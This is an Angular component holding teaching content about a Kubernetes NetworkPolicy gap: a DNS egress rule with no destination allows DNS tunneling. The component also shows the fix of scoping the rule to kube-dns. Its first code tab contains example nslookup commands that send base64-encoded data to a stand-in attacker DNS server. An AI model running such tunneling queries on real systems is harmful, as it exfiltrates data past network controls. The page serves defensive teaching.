import { Component } from '@angular/core';
import { PageMetaComponent } from '../../../../../shared/page-meta/page-meta';
import { TheoryBlockComponent, TheoryPoint } from '../../../../../shared/theory-block/theory-block';
import { CodeBlockComponent, CodeTab } from '../../../../../shared/code-block/code-block';
import { TryItComponent, TryItExercise } from '../../../../../shared/try-it/try-it';
import { MisconceptionsComponent, Misconception } from '../../../../../shared/misconceptions/misconceptions';
import { SubtopicNavComponent } from '../../../../../shared/subtopic-nav/subtopic-nav';
import { SubtopicEyebrowComponent } from '../../../../../shared/subtopic-eyebrow/subtopic-eyebrow';

@Component({
  standalone: true,
  imports: [PageMetaComponent, TheoryBlockComponent, CodeBlockComponent, TryItComponent, MisconceptionsComponent, SubtopicNavComponent, SubtopicEyebrowComponent],
  templateUrl: './dns-egress-no-destination-exfil.html',
  styleUrl: './dns-egress-no-destination-exfil.scss'
})
export class TheAlwaysAllowDnsEgressRuleHasNoDestinationARealExfiltrationPathSubtopic {

  theory: TheoryPoint[] = [
    {
      heading: 'The main page\'s own DNS egress rule is repeated three times, always without a destination restriction',
      points: [
        'The main page\'s own "Cross-namespace + DNS egress" code tab, "ipBlock for external services" code tab, and TWO separate mistake entries all show the identical DNS-allow pattern: `ports: [{protocol: UDP, port: 53}, {protocol: TCP, port: 53}]` with NO `to:` field at all. In NetworkPolicy semantics, omitting `to:` in an egress rule item means the rule allows traffic to ANY destination on that port — the main page\'s own repeated advice is, functionally, "always allow port 53 to anywhere."',
        'The main page\'s own QnA does mention Cilium\'s L7 policies as a way to filter HTTP methods/paths — establishing that the page already knows standard NetworkPolicy is L3/L4-only with no visibility into request/query CONTENT — but never connects this L3/L4 limitation back to its own repeated, unscoped DNS rule to point out what that combination specifically permits.',
      ]
    },
    {
      heading: 'What this specific combination allows: DNS tunneling as a narrow, real exfiltration channel',
      points: [
        'Per widely-documented security analysis of Kubernetes NetworkPolicy, a rule allowing port 53 to any destination — necessary, since without it hostname resolution breaks entirely, exactly as the main page\'s own mistake entries explain — genuinely does guard against ACCIDENTAL over-restriction, but provides no protection at all against a MALICIOUS use of that same open channel: standard NetworkPolicy has no ability to inspect the CONTENT of a DNS query, only its destination IP and port.',
        'This means a compromised Pod can encode stolen data inside DNS query subdomains (`<base64-encoded-data>.attacker-controlled-domain.com`) and send those queries to an attacker-controlled external DNS server — a well-known technique called DNS tunneling — and the main page\'s own "always allow DNS" egress rule, exactly as written, does not block a single byte of it, since the rule has no destination restriction and NetworkPolicy has no query-content inspection capability at either L3/L4.',
        'The documented mitigation is scoping the DNS-allow rule\'s own `to:` field to ONLY the cluster\'s actual internal DNS service (CoreDNS/kube-dns), rather than leaving it open to any destination — this closes the exfiltration path specifically, since a compromised Pod can then only query the CLUSTER\'S OWN DNS resolver (which does not forward arbitrary attacker-controlled queries the way an unrestricted port-53-to-anywhere rule would permit), while still fully preserving the exact service-name-resolution functionality every one of the main page\'s own DNS-related mistake entries is protecting.',
      ]
    },
  ];

  codeTabs: CodeTab[] = [
    {
      label: 'The main page\'s own DNS rule, exactly as written, permits tunneling',
      language: 'bash',
      code: `# The main page's own exact pattern, repeated in multiple code tabs
# and mistake entries -- no "to:" field at all:
# egress:
#   - ports:
#       - protocol: UDP
#         port: 53
#       - protocol: TCP
#         port: 53
#   # no "to:" -- matches ANY destination on port 53

# A compromised pod, following this exact rule, queries an
# ATTACKER-CONTROLLED external DNS server -- fully permitted, since
# the rule places no restriction on WHICH DNS server is reached:
kubectl exec compromised-pod -- nslookup c2ntf.attacker-domain.com 203.0.113.50
# Server:  203.0.113.50     <- an EXTERNAL, attacker-controlled DNS
#                              server, not kube-dns/CoreDNS at all
# Address: 203.0.113.50#53
# -- succeeds. The main page's own rule allows this exact query,
#    since it only checks PORT 53, never WHICH destination IP.

# Encoding stolen data as a subdomain label and querying it:
kubectl exec compromised-pod -- nslookup c3VwZXItc2VjcmV0LWRhdGE.attacker-domain.com 203.0.113.50
# -- the DNS QUERY ITSELF carries the exfiltrated payload
#    (base64-ish encoded in the subdomain) to the attacker's own
#    resolver, which logs it server-side -- NetworkPolicy has no
#    visibility into this content at all, only the port-53 wrapper.`,
    },
    {
      label: 'Scoping the rule to CoreDNS closes the exfiltration path',
      language: 'bash',
      code: `# The fix: restrict the DNS-allow rule's own "to:" field to ONLY
# the cluster's real internal DNS service, instead of leaving the
# destination completely open:
kubectl get svc -n kube-system kube-dns -o jsonpath='{.spec.clusterIP}'
# 10.96.0.10

# apiVersion: networking.k8s.io/v1
# kind: NetworkPolicy
# metadata: { name: default-deny-egress }
# spec:
#   podSelector: {}
#   policyTypes: [Egress]
#   egress:
#     - to:
#         - namespaceSelector:
#             matchLabels: { kubernetes.io/metadata.name: kube-system }
#           podSelector:
#             matchLabels: { k8s-app: kube-dns }   # <- scoped destination
#       ports:
#         - protocol: UDP
#           port: 53
#         - protocol: TCP
#           port: 53

# Ordinary service-name resolution still works exactly as before:
kubectl exec normal-pod -- nslookup postgres-service
# Server:  10.96.0.10     <- kube-dns, allowed
# -- succeeds, same as always.

# But the SAME attempt to query an external, attacker-controlled
# resolver is now blocked at the network layer:
kubectl exec compromised-pod -- nslookup c2ntf.attacker-domain.com 203.0.113.50
# ;; connection timed out; no servers could be reached
# -- the DNS-tunneling path this subtopic demonstrates is closed,
#    while everything the main page's own mistake entries warn
#    about (normal DNS resolution breaking) remains fully working.`,
    },
  ];

  exercise: TryItExercise = {
    prompt: 'Following the main page\'s own repeated advice exactly, a team adds <code>ports: [{protocol: UDP, port: 53}, {protocol: TCP, port: 53}]</code> (no <code>to:</code> field) to their default-deny egress policy, confirming normal service-name resolution now works correctly. A security review later flags this exact rule as an exfiltration risk. The team pushes back: "we followed the documented best practice for allowing DNS — how can the correct fix also be a vulnerability?" Using this subtopic\'s theory, reconcile these two claims.',
    hint: 'The rule fixes the "pods can\'t resolve service names" problem by allowing port 53. Does allowing port 53 to work at all require allowing it to EVERY possible destination, or could the same functional fix be scoped more narrowly?',
    solution: 'Per this subtopic\'s theory, both claims are correct, because they\'re about two different things. The rule, exactly as the main page\'s own mistake entries document it, genuinely and correctly fixes the "pods can\'t resolve service names" problem — that part of the "best practice" claim is accurate, and removing the rule entirely would break DNS resolution exactly as those mistake entries warn. But the SAME rule, because it has no `to:` destination restriction, also permits DNS queries to any external server, not just the cluster\'s own CoreDNS — and since NetworkPolicy has no visibility into DNS query CONTENT at L3/L4, this unrestricted destination creates a real, documented exfiltration path via DNS tunneling that has nothing to do with whether service-name resolution works. The security review isn\'t contradicting the original advice; it\'s pointing out that the SAME functional fix (allowing DNS) can be achieved with a narrower, equally effective rule — scoping the `to:` field to only the cluster\'s actual CoreDNS/kube-dns service closes the exfiltration path while preserving 100% of the legitimate DNS resolution functionality the original, broader rule was protecting. The "best practice" wasn\'t wrong; it was incomplete — allowing port 53 was necessary, but allowing it to ANY destination was never actually required for the stated goal.'
  };

  misconceptions: Misconception[] = [
    {
      thought: 'The main page\'s own DNS-allow egress rule, exactly as written across every code tab and mistake entry (no destination restriction), is the complete, correct, secure way to permit DNS resolution in a default-deny egress policy.',
      reality: 'Per this subtopic\'s theory, the rule as written is functionally correct for enabling DNS resolution, but leaves a real, documented exfiltration path open via DNS tunneling to any external destination — a narrower version scoped to the cluster\'s own CoreDNS service achieves the same functional goal without this gap.'
    },
    {
      thought: 'NetworkPolicy\'s inability to inspect DNS query content is a rare, theoretical limitation that doesn\'t meaningfully matter in practice, since DNS is "just for hostname lookups."',
      reality: 'Per this subtopic\'s exercise, DNS tunneling — encoding arbitrary data inside DNS query subdomains sent to an attacker-controlled resolver — is a well-documented, practical technique specifically because DNS traffic is so commonly left unrestricted by default, exactly the pattern the main page\'s own repeated advice produces.'
    },
    {
      thought: 'Scoping a DNS-allow rule\'s destination to only the cluster\'s own CoreDNS service would break legitimate use cases, like applications that need to query external DNS servers directly for reasons unrelated to Kubernetes service discovery.',
      reality: 'Per this subtopic\'s theory, scoping the rule to CoreDNS only affects the DEFAULT egress policy\'s blanket DNS allowance — an application with a genuine, specific need to query an external DNS server directly can still be granted that via its own explicit, separately-scoped NetworkPolicy rule, rather than relying on an unrestricted blanket rule that also happens to permit it by accident.'
    }
  ];
}
